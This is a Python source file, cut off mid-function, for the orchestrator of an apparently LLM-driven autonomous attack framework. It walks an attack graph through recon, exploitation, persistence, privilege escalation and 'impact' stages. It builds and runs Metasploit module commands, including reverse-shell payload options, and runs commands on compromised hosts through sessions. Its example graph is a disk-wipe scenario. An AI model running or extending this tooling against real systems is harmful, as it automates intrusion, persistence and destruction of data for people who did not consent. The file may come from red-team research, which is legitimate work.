"""
Graph-Driven Orchestrator — walks an AttackGraph, dispatching subagents per node.

Architecture:
    Load/receive AttackGraph
        │
        ▼
    ┌─ LOOP ─────────────────────────────────────────────┐
    │  ready = graph.ready_nodes()                       │
    │  if none → done                                    │
    │  for each ready node:                              │
    │    context = graph.gather_preceding_findings(node)  │
    │    dispatch to subagent (based on node.agent_type)  │
    │    write findings + commands back to node           │
    │    update graph status                             │
    │    graph.save() (checkpoint)                       │
    └────────────────────────────────────────────────────┘

Usage:
    from core_agents.orchestrator import run_graph
    from core_agents.attack_graph import AttackGraph

    graph = AttackGraph.load("examples/disk_wipe_graph.json")
    result = run_graph(graph)

    # Or interactively:
    python -m core_agents.orchestrator examples/disk_wipe_graph.json
"""

import re
import sys
import json
import time
import logging
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

from core_agents.attack_graph import AttackGraph, AttackNode, AttackEdge, EdgeCheck, NodeStatus
from core_agents import mitre
from core_agents.common import (
    Colors, print_colored, run_ssh_command, call_llm, parse_json_response,
    MAX_PIPELINE_RETRIES,
)
from langchain_core.messages import HumanMessage

from stages.recon import run_recon
from stages.initial_access import run_exploitation
from stages.persistence import run_persistence
from stages.privesc import run_privesc
from stages.impact import run_impact


# =============================================================================
# MODEL CONFIGURATION — replanner + judge call LLM directly here
# =============================================================================
# Stages 1-4 + Fix 1 fixed the orchestrator's process around replanning. Live
# evidence (see reports/) showed the remaining bottleneck is the LLM's
# instruction-following quality — gpt-4o-mini ignored "DO NOT repeat" hints in
# Stage 4 v2, and hallucinates MSF module paths ~20% of the time. Pinning these
# two calls to gpt-4o (~10x cost of mini) is an experiment to see how much
# improves with model strength alone, before pursuing the more invasive
# docs/plans/replanner_reliability_plan.md stages.
#
# Stage subagents (recon, exploit, persistence, etc.) still use whatever model
# their own modules pick — out of scope for this experiment.
REPLAN_MODEL_NAME = "gpt-4o"
JUDGE_MODEL_NAME = "gpt-4o"


# =============================================================================
# LOGGING — file + console, so we can tail progress in real-time
# =============================================================================

def _setup_logger(graph_name: str) -> logging.Logger:
    """Create a logger that writes to both console and a per-graph log file."""
    log_dir = Path("logs")
    log_dir.mkdir(exist_ok=True)

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = log_dir / f"{graph_name}_{timestamp}.log"

    logger = logging.getLogger(f"orchestrator.{graph_name}")
    logger.setLevel(logging.DEBUG)
    logger.handlers.clear()

    # File handler — everything
    fh = logging.FileHandler(log_file, encoding="utf-8")
    fh.setLevel(logging.DEBUG)
    fh.setFormatter(logging.Formatter(
        "%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%H:%M:%S",
    ))
    logger.addHandler(fh)

    # Console handler — INFO and above
    ch = logging.StreamHandler()
    ch.setLevel(logging.INFO)
    ch.setFormatter(logging.Formatter("%(message)s"))
    logger.addHandler(ch)

    logger.info(f"Log file: {log_file}")
    return logger


# =============================================================================
# SUBAGENT DISPATCH — routes a node to the right stage runner
# =============================================================================

_SUBAGENT_TYPES = {"recon", "exploit", "persistence", "privesc", "impact", "discovery"}


def _dispatch_subagent(agent_type, node, graph, preceding, explore, log=None):
    """Route a node to its stage subagent (the LLM planner/executor/critic loop)."""
    if agent_type == "recon":
        return _dispatch_recon(node, graph, preceding, explore)
    elif agent_type == "exploit":
        return _dispatch_exploit(node, graph, preceding, explore)
    elif agent_type == "persistence":
        return _dispatch_persistence(node, graph, preceding, explore)
    elif agent_type == "privesc":
        return _dispatch_privesc(node, graph, preceding, explore)
    elif agent_type == "impact":
        return _dispatch_impact(node, graph, preceding, explore)
    elif agent_type == "discovery":
        return _dispatch_discovery(node, graph, preceding, explore)
    else:
        if log:
            log.warning(f"  Unknown agent_type '{agent_type}' — skipping node.")
        return {"success": False, "summary": f"Unknown agent_type: {agent_type}"}


def dispatch_node(
    node: AttackNode,
    graph: AttackGraph,
    log: logging.Logger = None,
    explore: bool = False,
) -> dict:
    """
    Execute a single node by dispatching to the appropriate subagent.

    Args:
        explore: If False (default), the subagent MUST follow the node's
                 module/options/commands exactly. No freelancing.
                 If True, the subagent may explore alternatives.
    """
    agent_type = node.agent_type
    preceding = graph.gather_preceding_findings(node.id)
    log = log or logging.getLogger("orchestrator")

    log.info(f"[Dispatch] node='{node.id}' label='{node.label}' agent={agent_type} explore={explore}")
    log.debug(f"  objective: {node.objective[:200]}")
    if node.module:
        log.debug(f"  module: {node.module}  payload: {node.payload}")
        log.debug(f"  module_options: {node.module_options}")
    if node.commands_to_run:
        log.debug(f"  commands_to_run: {node.commands_to_run}")
    if preceding:
        for pid, pf in preceding.items():
            log.info(f"  preceding[{pid}]:")
            log.info(f"    success: {pf.get('success')}")
            log.info(f"    summary: {pf.get('summary', '')}")
            if pf.get("os_detected"):
                log.info(f"    os: {pf.get('os_detected')}")
            if pf.get("ports"):
                ports = pf["ports"]
                port_str = ", ".join(f"{p.get('port')}/{p.get('service','')}" for p in ports[:20])
                log.info(f"    ports ({len(ports)}): {port_str}")
            if pf.get("session_id"):
                log.info(f"    session: {pf.get('session_id')} ({pf.get('session_type','?')}) level={pf.get('access_level','?')}")
            if pf.get("method"):
                log.info(f"    method: {pf.get('method')}")
            if pf.get("technique"):
                log.info(f"    technique: {pf.get('technique')}")

    # --- DIRECT EXECUTION: always try first when node has module/commands ---
    # Skip direct for recon — needs LLM to parse nmap into structured findings
    if (node.module or node.commands_to_run) and agent_type != "recon":
        log.info(f"  [direct] Attempting direct execution (no LLM)...")
        findings = _execute_direct(node, graph, log)
        if findings.get("success"):
            return findings
        log.warning(f"  [{node.id}] Direct execution failed: {findings.get('summary', '?')}")
        # FALLBACK (explore mode only): hand the failed node to its stage
        # subagent so the LLM can improvise WITHIN this stage's scope before the
        # walker backtracks / replanner restructures. In strict mode (explore=
        # False) we honour _STRICT_PREFIX and just report the failure.
        if explore and agent_type in _SUBAGENT_TYPES:
            log.info(f"  [{node.id}] [fallback] direct failed — handing to '{agent_type}' subagent to improvise...")
            sub = _dispatch_subagent(agent_type, node, graph, preceding, explore, log=log)
            if sub.get("success"):
                sub["recovered_via"] = "subagent_fallback"
                log.info(f"  [{node.id}] [fallback] subagent recovered the node.")
                return sub
            # Subagent also failed — keep direct's failure classification if the
            # subagent didn't provide one, and flag that both paths were tried.
            sub.setdefault("failure_category", findings.get("failure_category", "generic"))
            sub.setdefault("failure_cause", findings.get("failure_cause", ""))
            sub["direct_attempt_failed"] = True
            return sub
        return findings

    # --- LLM STAGE RUNNERS (recon, or goal-only nodes without module/commands) ---
    return _dispatch_subagent(agent_type, node, graph, preceding, explore, log=log)


# =============================================================================
# STRICT MODE DIRECTIVE — injected when explore=False
# =============================================================================

_STRICT_PREFIX = """
=== MANDATORY DIRECTIVE — STRICT MODE ===
You MUST follow the EXACT plan below. Do NOT query the knowledge base for
alternatives. Do NOT choose a different module. Do NOT explore other services.
Execute ONLY what is specified. If it fails, report the failure — do NOT
try something else.
==========================================
"""


def _build_objective(node: AttackNode, graph: AttackGraph, explore: bool) -> str:
    """Build the objective string, optionally with strict directive."""
    objective = node.objective or graph.objective

    if node.module:
        if explore:
            # Hint — agent may override
            objective += f"\n\nSUGGESTED MODULE: {node.module}"
        else:
            # Strict — agent must follow
            objective = _STRICT_PREFIX + objective
            objective += f"\n\nREQUIRED MODULE: {node.module}"

        if node.payload:
            objective += f"\nPayload: {node.payload}"
        if node.module_options:
            objective += f"\nModule options: {json.dumps(node.module_options)}"
        if node.payload_options:
            objective += f"\nPayload options: {json.dumps(node.payload_options)}"

        if not explore:
            # Build exact MSF command sequence for the agent
            cmds = [f"use {node.module}"]
            for k, v in node.module_options.items():
                cmds.append(f"set {k} {v}")
            if node.payload:
                cmds.append(f"set PAYLOAD {node.payload}")
                for k, v in node.payload_options.items():
                    cmds.append(f"set {k} {v}")
            cmds.append("run")
            objective += "\n\nEXACT COMMAND SEQUENCE:\n" + "\n".join(
                f"  {i+1}. {cmd}" for i, cmd in enumerate(cmds)
            )

    elif node.commands_to_run:
        if not explore:
            objective = _STRICT_PREFIX + objective
        objective += f"\n\nCOMMANDS TO EXECUTE:\n" + "\n".join(
            f"  {i+1}. {cmd}" for i, cmd in enumerate(node.commands_to_run)
        )

    elif not explore:
        objective = _STRICT_PREFIX + objective

    return objective


# =============================================================================
# DIRECT EXECUTION — bypass LLM in strict mode
# =============================================================================

def _execute_direct(node: AttackNode, graph: AttackGraph, log: logging.Logger) -> dict:
    """
    Execute a node directly without any LLM calls.

    Routes based on tool_name first, then falls back to heuristics:
      - tool_name="metasploit" + module → structured MSF module execution
      - tool_name="metasploit" + commands_to_run → raw MSF console commands
      - tool_name="session" → session commands on target (needs active session)
      - tool_name="nmap"/"ssh"/etc → SSH commands on Kali
      - Otherwise: heuristic based on agent_type / preceding session
    """
    from tools.metasploit_tools import msf_session

    preceding = graph.gather_preceding_findings(node.id)
    tool = (node.tool_name or "").lower()

    # Structured MSF module execution
    if node.module:
        return _execute_msf_module(node, graph, log, msf_session, preceding)

    if not node.commands_to_run:
        log.warning(f"  [direct] Node has no module or commands — cannot execute directly")
        return {"success": False, "summary": "No module or commands defined on node"}

    # Route by tool_name first
    if tool == "metasploit":
        return _execute_msf_console_commands(node, graph, log, msf_session)

    if tool == "session":
        session_id, _, _ = _find_session(preceding)
        if not session_id:
            return {"success": False, "summary": "tool_name=session but no active session in preceding nodes"}
        return _execute_session_commands(node, log, msf_session, session_id)

    # Heuristic fallback (no tool_name): if we have a session and node is post-exploitation, use it
    session_id, _, _ = _find_session(preceding)
    if session_id and node.agent_type in ("impact", "discovery", "persistence"):
        return _execute_session_commands(node, log, msf_session, session_id)

    return _execute_ssh_commands(node, log)


def _execute_msf_console_commands(
    node: AttackNode, graph: AttackGraph,
    log: logging.Logger, msf_session,
) -> dict:
    """Execute raw MSF console commands (when no structured module is set)."""
    target_ip = node.target_ip or graph.target_ip
    all_output = ""
    params = _resolve_command_params(node, log)

    for template in node.commands_to_run:
        cmd = _render_command(template, params)
        log.info(f"  [direct] msf> {cmd}")
        output = msf_session.send_command(cmd, timeout=120)
        node.add_command(cmd, tool="msf_console", output=output, target="msf_console")
        all_output += output + "\n"

        preview = output.strip()[:300]
        if preview:
            log.info(f"  [direct]   {preview}")

    return _parse_msf_output(all_output, node, target_ip, log)


def _execute_msf_module(
    node: AttackNode, graph: AttackGraph,
    log: logging.Logger, msf_session, preceding: list = None,
) -> dict:
    """Execute a Metasploit module directly via console commands.

    On retries, swap in alternative values from `module_options_alternatives`
    (or `payload_options_alternatives` if present) based on the current retry
    count. retries=0 → original options. retries=1 → alts[0]. etc.
    """
    target_ip = node.target_ip or graph.target_ip

    # Build effective options using alternatives based on retry count
    retry_idx = node.retries  # 0 on first attempt, 1 on first retry, ...
    effective_module_options = dict(node.module_options)
    effective_payload = node.payload
    effective_payload_options = dict(node.payload_options)
    tweaks_applied = []

    if retry_idx > 0 and node.module_options_alternatives:
        alt_idx = retry_idx - 1  # retries=1 → alts[0]
        for field_name, alts in node.module_options_alternatives.items():
            if alt_idx < len(alts):
                new_value = alts[alt_idx]
                if field_name == "PAYLOAD":
                    effective_payload = new_value
                elif field_name in effective_payload_options:
                    effective_payload_options[field_name] = new_value
                else:
                    effective_module_options[field_name] = new_value
                tweaks_applied.append(f"{field_name}={new_value}")
        if tweaks_applied:
            log.info(f"  [direct] Retry {retry_idx} tweaks: {', '.join(tweaks_applied)}")

    # F4: session-requiring modules (local exploits, service_persistence, ...) take a
    # SESSION option. The graph often hard-codes SESSION=1, but msfrpcd's session
    # counter increments, so the real session may be 2/3/... — running the module
    # against the wrong (nonexistent) session hangs/fails (flaw_persistence: the graph
    # set SESSION 1 while the live session was 3). Override SESSION with the actual
    # tracked session id from preceding findings.
    if any(str(k).upper() == "SESSION" for k in effective_module_options):
        real_sid, _, _ = _find_session(preceding or [])
        if real_sid:
            for k in list(effective_module_options):
                if str(k).upper() == "SESSION" and str(effective_module_options[k]) != str(real_sid):
                    log.info(f"  [direct] F4: overriding {k}={effective_module_options[k]} → {real_sid} (actual session)")
                    effective_module_options[k] = real_sid

    # Build command sequence from effective options
    cmds = [f"use {node.module}"]
    for k, v in effective_module_options.items():
        cmds.append(f"set {k} {v}")
    if effective_payload:
        cmds.append(f"set PAYLOAD {effective_payload}")
    # Always set LHOST/LPORT/etc. from payload_options so the module's
    # default payload (when no explicit PAYLOAD is set) still gets our
    # values -- otherwise MSF binds LHOST to 127.0.0.1 and the reverse
    # handler never sees the callback. Fixes Stage 4 v1/v2's 70+ "binding
    # to a loopback address" warnings.
    for k, v in effective_payload_options.items():
        cmds.append(f"set {k} {v}")
    cmds.append("run")

    # Execute each command
    all_output = ""
    for cmd in cmds:
        log.info(f"  [direct] > {cmd}")
        output = msf_session.send_command(cmd, timeout=120)
        node.add_command(cmd, tool="msf_console", output=output, target="msf_console")
        all_output += output + "\n"

        # Log first 300 chars of output
        preview = output.strip()[:300]
        if preview:
            log.info(f"  [direct]   {preview}")

    # Parse the combined output for results
    return _parse_msf_output(all_output, node, target_ip, log)


def _resolve_command_params(node: AttackNode, log: logging.Logger) -> dict:
    """
    Build the effective command_params for the current retry, applying
    alternatives based on node.retries (same semantics as MSF options).
    """
    effective = dict(node.command_params)
    retry_idx = node.retries

    if retry_idx > 0 and node.command_params_alternatives:
        alt_idx = retry_idx - 1
        tweaks = []
        for field_name, alts in node.command_params_alternatives.items():
            if alt_idx < len(alts):
                effective[field_name] = alts[alt_idx]
                tweaks.append(f"{field_name}={alts[alt_idx]}")
        if tweaks:
            log.info(f"  [direct] Retry {retry_idx} command_params tweaks: {', '.join(tweaks)}")

    return effective


def _render_command(template: str, params: dict) -> str:
    """Substitute {name} placeholders in a command string using params."""
    if not params:
        return template
    try:
        return template.format(**params)
    except (KeyError, IndexError):
        # Missing placeholder — return the template untouched
        return template


def _with_stderr_capture(cmd: str) -> str:
    """Append `2>&1` so a session command's STDERR is captured.

    P0 fix: a non-root `echo > /root/x` / `cat /root/x` writes its error
    ("Permission denied", "No such file or directory") to STDERR, which the MSF
    shell_read did NOT capture — so the failure scanner saw clean output and the
    node FALSELY reported success (flaw_impact). Merging stderr into stdout lets
    the existing _FAILURE_INDICATORS catch it -> success=False -> the node retries
    -> _resolve_command_params swaps in command_params_alternatives (e.g. /tmp).
    Skip commands that already manage stderr (e.g. `... 2>/dev/null`).
    """
    cmd = cmd.strip()
    if not cmd or "2>" in cmd:
        return cmd
    return f"{cmd} 2>&1"


# Concrete failure-indicator phrases. These are case-insensitive substring
# matches against command output. The list comes from observed false positives
# in live runs (see reports/stage_{1,2,3}_live_test.md) — every entry here is
# a phrase that previously got marked success=True despite being a clear failure.
_FAILURE_INDICATORS: list[str] = [
    "permission denied",
    "no such file or directory",
    "cannot access",
    "command not found",
    "operation not permitted",
    "connection refused",
    "exec format error",
    "is a directory",          # "echo > /etc/passwd" style mistakes
    "bad substitution",        # bash syntax error
    "syntax error",
    "does not exist",          # covers "file does not exist" etc.
    "ssh connection/execution error",   # from common.run_ssh_command
    "(exit code:",             # from common.run_ssh_command's non-zero-exit wrap
    # Dead/invalid MSF session: run_session_command returns this exact string when
    # the session id isn't live. Previously NOT scanned, so a file_drop whose every
    # command returned "Session N not found" still reported success (F2, flaw_privesc).
    "not found. use tool_metasploit_rpc",
    "could not resolve host",
    "host key verification failed",
    # CLI usage hints that mean the command did NOTHING. Caught when a tool
    # prints a help-style message instead of doing the work. Real example:
    # `wipe -f -q /tmp` prints "Use -r option to wipe directories" and exits
    # without wiping. Previously marked success because no failure phrase
    # matched -- but the operation clearly didn't happen.
    "use -r option",
    "use --recursive",
    "missing operand",
    "invalid option",
    "unrecognized option",
    "try '",                   # "try 'cmd --help' for more information"
    "try \"",                  # same with double quotes
]


def _command_output_indicates_failure(output: str) -> tuple[bool, str]:
    """
    Scan one command's stdout/stderr for known failure phrases.

    Returns (is_failure, matched_phrase). The match is case-insensitive
    substring. Used by the session/SSH executors to overrule the previous
    loose "any non-empty output = success" heuristic that caused multiple
    Stage 1-3 live runs to mark nodes SUCCESS when commands clearly failed.

    `(no output)` is NOT a failure on its own — many useful commands
    (mkdir, chmod, echo > file) legitimately produce nothing.
    """
    if not output:
        return False, ""
    low = output.lower()
    for phrase in _FAILURE_INDICATORS:
        if phrase in low:
            return True, phrase
    return False, ""


def _scan_commands_for_failure(
    node: AttackNode, log: logging.Logger,
) -> tuple[bool, str]:
    """
    Walk the CURRENT attempt's CommandRecord entries and return the first
    failure detected, if any. Returns (any_failed, summary_line).

    Only scans the most recent N records where N = len(node.commands_to_run)
    -- otherwise prior-attempt failures leak into the current attempt's
    verdict (e.g. retry succeeds, but a stale "Use -r option" from the
    failed first attempt still in node.commands causes a false re-fail).
    """
    n = len(node.commands_to_run) if node.commands_to_run else len(node.commands)
    recent = node.commands[-n:] if n > 0 else []
    for rec in recent:
        bad, phrase = _command_output_indicates_failure(rec.output)
        if bad:
            summary = (
                f"Command failed ({phrase!r}): {rec.command[:80]}"
            )
            log.warning(f"  [direct] {summary}")
            return True, summary
    return False, ""


def _execute_ssh_commands(node: AttackNode, log: logging.Logger) -> dict:
    """Execute shell commands on Kali via SSH (with templated params)."""
    all_output = ""
    params = _resolve_command_params(node, log)

    for template in node.commands_to_run:
        cmd = _render_command(template, params)
        log.info(f"  [direct] $ {cmd}")
        output = run_ssh_command(cmd)
        node.add_command(cmd, tool="ssh", output=output, target="kali")
        all_output += output + "\n"

        preview = output.strip()[:300]
        if preview:
            log.info(f"  [direct]   {preview}")

    failed, fail_summary = _scan_commands_for_failure(node, log)
    if failed:
        return {
            "success": False,
            "summary": fail_summary,
            "output": all_output[:5000],
        }

    return {
        "success": True,
        "summary": f"Executed {len(node.commands_to_run)} command(s) on Kali",
        "output": all_output[:5000],
    }


def _execute_session_commands(
    node: AttackNode, log: logging.Logger,
    msf_session, session_id: str,
) -> dict:
    """Execute commands on the target through an active MSF session (with templated params)."""
    all_output = ""
    params = _resolve_command_params(node, log)

    for template in node.commands_to_run:
        cmd = _render_command(template, params)
        log.info(f"  [direct] session({session_id})> {cmd}")
        # Capture stderr so denied writes / missing files are SEEN by the failure
        # scanner (else false success — see _with_stderr_capture).
        output = msf_session.run_session_command(
            session_id, _with_stderr_capture(cmd), timeout=30)
        node.add_command(cmd, tool="session", output=output, target="target")
        all_output += output + "\n"

        preview = output.strip()[:300]
        if preview:
            log.info(f"  [direct]   {preview}")

    failed, fail_summary = _scan_commands_for_failure(node, log)
    if failed:
        return {
            "success": False,
            "session_id": session_id,
            "summary": fail_summary,
            "output": all_output[:5000],
        }

    # Grounding (F2): if the node declares a proof marker, it MUST actually appear in
    # the captured target output (e.g. the file_drop's `cat` read-back) — otherwise the
    # write is unverified and we must NOT claim success. This is what made file_drop a
    # false positive: it counted commands *executed* without confirming the read-back
    # contained the proof (compounded by F5, now fixed, which had eaten that output).
    marker = None
    if isinstance(getattr(node, "command_params", None), dict):
        marker = node.command_params.get("marker")
    if not marker and isinstance(getattr(node, "metadata", None), dict):
        marker = node.metadata.get("marker")
    if marker and str(marker) not in all_output:
        summary = (f"Unverified: proof marker {str(marker)[:60]!r} not found in target "
                   f"output — write not confirmed (session may be dead, or write failed)")
        log.warning(f"  [direct] {summary}")
        return {
            "success": False,
            "session_id": session_id,
            "summary": summary,
            "output": all_output[:5000],
        }

    return {
        "success": True,
        "session_id": session_id,
        "summary": f"Executed {len(node.commands_to_run)} command(s) on target via session {session_id}",
        "output": all_output[:5000],
    }


# Groups that confer ALL-command sudo rights on common Linux distros. If the
# session user is in any of these, we treat access_level as "user_with_sudo".
_SUDO_GROUPS = {"sudo", "wheel", "admin"}


# Stage C: ordered failure-cause patterns. First match wins, so put specific
# patterns before generic ones. Each entry: (compiled regex, category).
# Categories are short stable labels the LLM can react to programmatically.
_MSF_FAILURE_PATTERNS: list[tuple[re.Pattern, str]] = [
    (re.compile(r"Failed to load module", re.IGNORECASE), "module_load_failed"),
    (re.compile(r"is not a compatible payload", re.IGNORECASE), "incompatible_payload"),
    (re.compile(r"directory not writable", re.IGNORECASE), "writable_path_missing"),
    (re.compile(r"website path", re.IGNORECASE), "writable_path_missing"),
    (re.compile(r"(adjust TARGETURI|Cookie not found|No cookie found)", re.IGNORECASE), "wrong_targeturi"),
    (re.compile(r"Connection refused", re.IGNORECASE), "network_refused"),
    (re.compile(r"could not resolve host", re.IGNORECASE), "network_dns"),
    (re.compile(r"bad-config:", re.IGNORECASE), "config_problem"),
    (re.compile(r"timeout|timed out", re.IGNORECASE), "timeout"),
    (re.compile(r"Authentication failed|Login failed|no credentials found|"
                r"All login attempts failed|No valid credentials",
                re.IGNORECASE), "auth_failed"),
]


def _classify_msf_failure(output: str) -> tuple[str, str]:
    """
    Scan MSF output for known failure patterns and return (category, phrase).

    `category` is a short stable label (writable_path_missing, etc.) for
    programmatic use. `phrase` is the actual matched substring with a bit
    of surrounding context, for human/LLM consumption.

    Returns ("generic", "") if no pattern matches.
    """
    if not output:
        return "generic", ""
    for pattern, category in _MSF_FAILURE_PATTERNS:
        m = pattern.search(output)
        if m:
            # Snip ~120 chars of surrounding context for the phrase
            start = max(0, m.start() - 40)
            end = min(len(output), m.end() + 80)
            phrase = output[start:end].replace("\n", " ").strip()
            return category, phrase
    return "generic", ""


def _extract_privilege_from_msf_output(output: str) -> dict:
    """
    Parse `id` / `uid=N(name) gid=N(name) groups=N(name),N(name) ...` strings
    out of MSF output (typically embedded in ssh_login's Success line).

    Returns a dict like:
        {"uid": 900, "user": "vagrant", "gid": 900, "gid_name": "vagrant",
         "groups": ["vagrant", "sudo"], "in_sudo_group": True, "is_root": False}

    Returns {} if no uid= pattern found. Be liberal — different shells emit
    fields in different orders.
    """
    uid_match = re.search(r'uid=(\d+)\((\w+)\)', output)
    if not uid_match:
        return {}
    info: dict = {
        "uid": int(uid_match.group(1)),
        "user": uid_match.group(2),
    }
    gid_match = re.search(r'gid=(\d+)\((\w+)\)', output)
    if gid_match:
        info["gid"] = int(gid_match.group(1))
        info["gid_name"] = gid_match.group(2)
    groups_match = re.search(r'groups=([^\s\'"]+)', output)
    if groups_match:
        # Format: 900(vagrant),27(sudo),...
        group_names = re.findall(r'\d+\((\w+)\)', groups_match.group(1))
        info["groups"] = group_names
        info["in_sudo_group"] = any(g in _SUDO_GROUPS for g in group_names)
    info["is_root"] = info["uid"] == 0
    return info


def _derive_access_level(priv: dict) -> str:
    """Map privilege dict to a coarse access_level label."""
    if not priv:
        return "unknown"
    if priv.get("is_root"):
        return "root"
    if priv.get("in_sudo_group"):
        return "user_with_sudo"
    return "user"


def _parse_msf_output(output: str, node: AttackNode, target_ip: str, log: logging.Logger) -> dict:
    """
    Parse Metasploit output to determine success and extract findings.

    Looks for:
      - "session X opened" → session created
      - "Login Successful" → credentials found
      - "Exploit completed, but no session" → failed

    Also tries to extract session privilege info (uid/gid/groups) from the
    output and store it as findings.session_user_info + access_level.
    """
    findings = {
        "success": False,
        "target_ip": target_ip,
        "exploit_used": node.module,
        "session_id": "",
        "session_type": "",
        "access_level": "unknown",
        "summary": "",
    }

    # Stage B: extract privilege from any embedded id-style output
    priv = _extract_privilege_from_msf_output(output)
    if priv:
        findings["session_user_info"] = priv
        findings["access_level"] = _derive_access_level(priv)
        log.info(
            f"  [direct] Session privilege: {priv.get('user')} "
            f"(uid={priv.get('uid')}, groups={priv.get('groups', [])}, "
            f"access_level={findings['access_level']})"
        )

    # Check for session opened
    session_match = re.search(
        r'(command shell|meterpreter)\s+session\s+(\d+)\s+opened',
        output, re.IGNORECASE,
    )
    if session_match:
        findings["success"] = True
        findings["session_type"] = session_match.group(1).lower().replace(" ", "_")
        findings["session_id"] = session_match.group(2)
        findings["summary"] = (
            f"Session {findings['session_id']} ({findings['session_type']}) "
            f"opened on {target_ip} via {node.module}"
        )
        log.info(f"  [direct] SESSION OPENED: {findings['summary']}")
        return findings

    # Check for successful login (ssh_login auxiliary)
    login_match = re.search(
        r'Success:\s*[\'"]?(\S+?)[\'"]?\s*:\s*[\'"]?(\S+?)[\'"]?\s',
        output, re.IGNORECASE,
    )
    if not login_match:
        login_match = re.search(
            r'Login Successful:\s*(\S+)',
            output, re.IGNORECASE,
        )
    if login_match:
        findings["success"] = True
        findings["summary"] = f"Login successful on {target_ip} via {node.module}"
        log.info(f"  [direct] LOGIN FOUND: {login_match.group(0)}")

        # ssh_login creates a session — check for it
        session_after = re.search(r'session\s+(\d+)\s+opened', output, re.IGNORECASE)
        if session_after:
            findings["session_id"] = session_after.group(1)
            findings["session_type"] = "command_shell"
            findings["summary"] += f" — session {findings['session_id']}"
        return findings

    # Check for explicit failure
    if "exploit completed, but no session" in output.lower():
        findings["summary"] = f"Exploit completed but no session created via {node.module}"
        log.info(f"  [direct] FAILED: no session created")
    elif "auxiliary module execution completed" in output.lower():
        findings["summary"] = f"Auxiliary module completed — no credentials found via {node.module}"
        log.info(f"  [direct] COMPLETED: no credentials found")
    else:
        findings["summary"] = f"Module execution completed — result unclear via {node.module}"
        log.info(f"  [direct] COMPLETED: result unclear, checking output...")

    # Stage C: tag the actual failure cause so the replanner can pivot
    # intelligently instead of guessing from a generic "no session" summary.
    category, phrase = _classify_msf_failure(output)
    findings["failure_category"] = category
    findings["failure_cause"] = phrase
    if category != "generic":
        log.info(f"  [direct] FAILURE CATEGORY: {category} -- {phrase[:120]}")

    return findings


# =============================================================================
# HELPERS — extract session/recon info from preceding findings
# =============================================================================

_ACCESS_RANK = {"root": 3, "user_with_sudo": 2, "sudo": 2, "user": 1}


def _find_session(preceding: dict) -> tuple[str, str, str]:
    """Find session_id, session_type, access_level from preceding findings.

    When more than one predecessor carries a successful session (e.g. both the
    initial-access node AND a privesc node that upgraded to a root meterpreter),
    prefer the MOST-ESCALATED one so impact runs as root rather than re-using the
    original user shell. privesc reports its post-escalation session via
    `new_level` + `session_id`; ties break toward the later finding (privesc runs
    after initial access). Single-predecessor behaviour is unchanged."""
    best = None  # (rank, sid, stype, level)
    for pred_id, pf in preceding.items():
        if not pf.get("success"):
            continue
        sid = str(pf.get("session_id") or "")
        if not sid:
            continue
        stype = pf.get("session_type", "shell")
        # privesc exposes the escalated level via new_level; others via access_level.
        level = pf.get("new_level") or pf.get("access_level", "unknown")
        rank = _ACCESS_RANK.get(str(level).lower(), 0)
        if best is None or rank >= best[0]:
            best = (rank, sid, stype, level)
    if best is None:
        return "", "", "unknown"
    return best[1], best[2], best[3]


def _find_recon(preceding: dict) -> tuple[dict, str, str]:
    """Find target_info, raw_nmap, os_info from preceding findings."""
    target_info = {}
    raw_nmap = ""
    os_info = ""
    for pred_id, pf in preceding.items():
        if "ports" in pf or "target_info" in pf:
            target_info = pf.get("target_info", {})
            raw_nmap = pf.get("raw_nmap_output", "")
        if "os_detected" in pf:
            os_info = pf["os_detected"]
    return target_info, raw_nmap, os_info


# =============================================================================
# DISPATCH IMPLEMENTATIONS — one per agent type
# =============================================================================

def _dispatch_recon(node: AttackNode, graph: AttackGraph, preceding: dict, explore: bool) -> dict:
    objective = _build_objective(node, graph, explore)
    findings = run_recon(
        target_ip=node.target_ip or graph.target_ip,
        goal=objective,
    )
    return dict(findings)


def _dispatch_exploit(node: AttackNode, graph: AttackGraph, preceding: dict, explore: bool) -> dict:
    target_info, raw_recon, _ = _find_recon(preceding)
    if not target_info:
        target_info = {"ip": node.target_ip or graph.target_ip}
    objective = _build_objective(node, graph, explore)

    # Always trim raw nmap — the full dump causes 187K+ tokens which exceeds
    # gpt-4o-mini's 128K context limit. The structured target_info.ports has
    # all the data the LLM needs.
    ports_list = target_info.get("ports", [])
    if ports_list:
        lines = [f"  {p.get('port')}/{p.get('service','')} {p.get('version','')}" for p in ports_list[:30]]
        raw_recon = f"Open ports on {target_info.get('ip', '')}:\n" + "\n".join(lines)
    else:
        raw_recon = ""

    findings = run_exploitation(
        target_info=target_info,
        objective=objective,
        raw_recon=raw_recon,
    )
    return dict(findings)


def _dispatch_persistence(node: AttackNode, graph: AttackGraph, preceding: dict, explore: bool) -> dict:
    session_id, session_type, access_level = _find_session(preceding)
    if not session_id:
        return {
            "success": False, "method": "", "details": "No active session.",
            "summary": "Persistence skipped — no session available.",
        }
    objective = _build_objective(node, graph, explore)

    findings = run_persistence(
        target_ip=node.target_ip or graph.target_ip,
        session_id=session_id,
        session_type=session_type,
        access_level=access_level,
        objective=objective,
        # The node (graph author or replanner) chooses the MITRE technique; the
        # subagent chooses the procedure under it. Empty = legacy self-select.
        technique_id=node.technique_id,
        technique_slug=node.technique_name,
    )
    return dict(findings)


def _dispatch_privesc(node: AttackNode, graph: AttackGraph, preceding: dict, explore: bool) -> dict:
    session_id, session_type, access_level = _find_session(preceding)
    _, _, os_info = _find_recon(preceding)
    if not session_id:
        return {
            "success": False, "technique": "", "previous_level": "",
            "new_level": "", "summary": "PrivEsc skipped — no session available.",
        }

    findings = run_privesc(
        target_ip=node.target_ip or graph.target_ip,
        session_id=session_id,
        session_type=session_type,
        access_level=access_level,
        os_info=os_info,
        objective=_build_objective(node, graph, explore),
    )
    return dict(findings)


def _dispatch_impact(node: AttackNode, graph: AttackGraph, preceding: dict, explore: bool) -> dict:
    session_id, session_type, access_level = _find_session(preceding)
    if not session_id:
        return {
            "success": False, "actions": [],
            "summary": "Impact skipped — no session available.",
        }

    prior_lines = [f"{pid}: {pf.get('summary', 'N/A')}" for pid, pf in preceding.items()]
    objective = _build_objective(node, graph, explore)

    findings = run_impact(
        target_ip=node.target_ip or graph.target_ip,
        objective=objective,
        session_id=session_id,
        session_type=session_type,
        access_level=access_level,
        prior_findings_summary="\n".join(prior_lines),
    )
    return dict(findings)


def _dispatch_discovery(node: AttackNode, graph: AttackGraph, preceding: dict, explore: bool) -> dict:
    session_id, session_type, access_level = _find_session(preceding)
    if not session_id:
